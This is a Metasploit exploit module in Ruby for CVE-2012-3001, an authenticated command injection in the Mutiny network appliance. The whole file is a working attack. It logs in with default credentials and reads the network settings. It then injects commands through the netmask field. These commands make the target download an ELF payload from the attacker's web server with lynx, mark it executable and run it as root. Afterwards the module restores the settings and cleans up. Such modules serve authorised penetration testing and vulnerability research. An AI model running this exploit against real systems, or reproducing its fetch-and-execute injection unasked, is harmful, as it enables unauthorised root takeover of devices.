##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Mutiny Remote Command Execution',
      'Description'    => %q{
          This module exploits an authenticated command injection vulnerability in the
        Mutiny appliance. Versions prior to 4.5-1.12 are vulnerable. In order to exploit
        the vulnerability the mutiny user must have access to the admin interface. The
        injected commands are executed with root privileges. This module has been tested
        successfully on Mutiny 4.2-1.05.
      },
      'Author'         =>
        [
          'Christopher Campbell', # Vulnerability discovery
          'juan vazquez'          # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2012-3001'],
          ['OSVDB', '86570'],
          ['BID', '56165'],
          ['US-CERT-VU', '841851'],
          ['URL', 'http://obscuresecurity.blogspot.com.es/2012/10/mutiny-command-injection-and-cve-2012.html']
        ],
      'Privileged'     => true,
      'Platform'       => [ 'unix', 'linux' ],
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 4000
        },
      'Targets'        =>
        [
          [ 'Unix CMD',
            {
              'Arch' => ARCH_CMD,
              'Platform' => 'unix',
              #'Payload'        =>
              #  {
              #    'Compat'   =>
              #      {
              #        'PayloadType' => 'cmd',
              #        'RequiredCmd' => 'python'
              #      }
              #  },
            }
          ],
          [ 'Linux Payload',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'linux'
            }
          ]
        ],
      'DisclosureDate' => 'Oct 22 2012',
      'DefaultTarget' => 1))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to Mutiny', '/interface/' ]),
        OptString.new('USERNAME', [ true, 'The user to authenticate as', 'admin' ]),
        OptString.new('PASSWORD', [ true, 'The password to authenticate with', 'mutiny' ])
      ], self.class)
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def lookup_lhost()
    # Get the source address
    if datastore['SRVHOST'] == '0.0.0.0'
      Rex::Socket.source_address('50.50.50.50')
    else
      datastore['SRVHOST']
    end
  end

  def on_new_session(session)
    cmds = []
    cmds = [
      %Q|echo #{@netmask_eth0} > /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask|,
      %Q|tr -d "\\n\\r" < /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask > /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask.bak|,
      %Q|mv -f /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask.bak /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask|,
      %Q|sed -e s/NETMASK=.*/NETMASK=#{@netmask_eth0}/ ifcfg-eth0 > ifcfg-eth0.bak|,
      %Q|mv -f ifcfg-eth0.bak ifcfg-eth0|,
      %Q|/etc/init.d/network restart|
    ] unless not @netmask_eth0
    cmds << %Q|rm /tmp/#{@elfname}.elf| unless target.name =~ /CMD/

    print_status("#{peer} - Restoring Network Information and Cleanup...")
    begin
      session.shell_command_token(cmds.join(" ; "))
    rescue
      print_error("#{peer} - Automatic restore and cleanup didn't work, please use these commands:")
      cmds.each { |cmd|
        print_warning(cmd)
      }
    end
    print_good("#{peer} - Restoring and Cleanup successful")
  end

  def start_web_service
    print_status("#{peer} - Setting up the Web Service...")

    if datastore['SSL']
      ssl_restore = true
      datastore['SSL'] = false
    end

    resource_uri = '/' + @elfname + '.elf'
    service_url = "http://#{lookup_lhost}:#{datastore['SRVPORT']}#{resource_uri}"

    print_status("#{peer} - Starting up our web service on #{service_url} ...")
    start_service({'Uri' => {
      'Proc' => Proc.new { |cli, req|
        on_request_uri(cli, req)
      },
      'Path' => resource_uri
    }})
    datastore['SSL'] = true if ssl_restore

    return service_url
  end

  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{peer} - Waiting for the victim to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore['HTTP_DELAY'])
        fail_with(Exploit::Failure::Unknown, "Target didn't request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end

    #print_status("#{peer} - Giving time to the payload to execute...")
    #select(nil, nil, nil, 20) unless session_created?

    print_status("#{peer} - Shutting down the web service...")
    stop_service
  end

  # Handle incoming requests from the target
  def on_request_uri(cli, request)
    vprint_status("#{peer} - on_request_uri called, #{request} requested")

    if (not @elf_data)
      print_error("#{peer} - A request came in, but the ELF archive wasn't ready yet!")
      return
    end

    print_good("#{peer} - Sending the ELF payload to the target...")
    @elf_sent = true
    send_response(cli, @elf_data)
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'logon.jsp'),
    })

    if res and res.body =~ /: Mutiny : Login @ mutiny/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit

    print_status("#{peer} - Login with the provided credentials...")

    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, 'logon.do'),
      'vars_post' =>
      {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    })

    if res and res.code == 302 and res.headers['Location'] =~ /index.do/ and res.headers['Set-Cookie'] =~ /JSESSIONID=(.*);/
      print_good("#{peer} - Login successful")
      session = $1
    else
      fail_with(Exploit::Failure::NoAccess, "#{peer} - Unable to login in Mutiny")
    end

    print_status("#{peer} - Leaking current Network Information...")

    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => normalize_uri(target_uri.path, 'admin', 'cgi-bin', 'netconfig'),
      'cookie'    => "JSESSIONID=#{session}",
    })

    if res and res.code == 200 and res.body =~ /Ethernet Interfaces/
      adress_eth0 = (res.body =~ /<input type="text" value="(.*)" name="addresseth0" class="textInput" \/>/ ? $1 : "")
      @netmask_eth0 = (res.body =~ /<input type="text" value="(.*)" name="netmasketh0" class="textInput" \/>/ ? $1 : "")
      gateway = (res.body =~ /<input type="text" name="Gateway" value= "(.*)" class="textInput">/ ? $1 : "")
      dns_address = (res.body =~ /<input type="text" value="(.*)" name="dnsaddress0" class="textInput">/ ? $1 : "")
      static_route_address = (res.body =~ /<input class="textInput" type="text" name="staticRouteAddress" value="(.*)" \/>/ ? $1 : "")
      static_route_netmask = (res.body =~ /<input class="textInput" type="text" name="staticRouteNetmask" value="(.*)" \/>/ ? $1 : "")
      static_route_gateway = (res.body =~ /<input class="textInput" type="text" name="staticRouteGateway" value="(.*)" \/>/ ? $1 : "")
      print_good("#{peer} - Information leaked successfully")
    else
      print_error("#{peer} - Error leaking information, trying to exploit with random values")
    end

    if target.name =~ /CMD/
      injection = @netmask_eth0.dup || rand_text_alpha(5 + rand(3))
      injection << "; #{payload.encoded}"
    else
      print_status("#{peer} - Generating the ELF Payload...")
      @elf_data = generate_payload_exe
      @elfname = Rex::Text.rand_text_alpha(3+rand(3))
      service_url = start_web_service
      injection = @netmask_eth0.dup || rand_text_alpha(5 + rand(3))
      injection << "; lynx -source \"#{service_url}\" > /tmp/#{@elfname}.elf"
      injection << "; chmod +x /tmp/#{@elfname}.elf"
      injection << "; /tmp/#{@elfname}.elf"

    end

    print_status("#{peer} - Exploiting Command Injection...")

    send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, 'admin', 'cgi-bin', 'netconfig'),
      'cookie'    => "JSESSIONID=#{session}",
      'vars_post' =>
      {
        "addresseth0" => adress_eth0 || rand_text_alpha(5 + rand(3)),
        "netmasketh0" => injection,
        "Gateway" => gateway || rand_text_alpha(5 + rand(3)),
        "dnsaddress0" => dns_address || rand_text_alpha(5 + rand(3)),
        "staticRouteAddress" => static_route_address || rand_text_alpha(5 + rand(3)),
        "staticRouteNetmask" => static_route_netmask || rand_text_alpha(5 + rand(3)),
        "staticRouteGateway" => static_route_gateway || rand_text_alpha(5 + rand(3))
      }
    }, 1)

    if target.name =~ /Linux Payload/
      wait_linux_payload
    end
  end



end
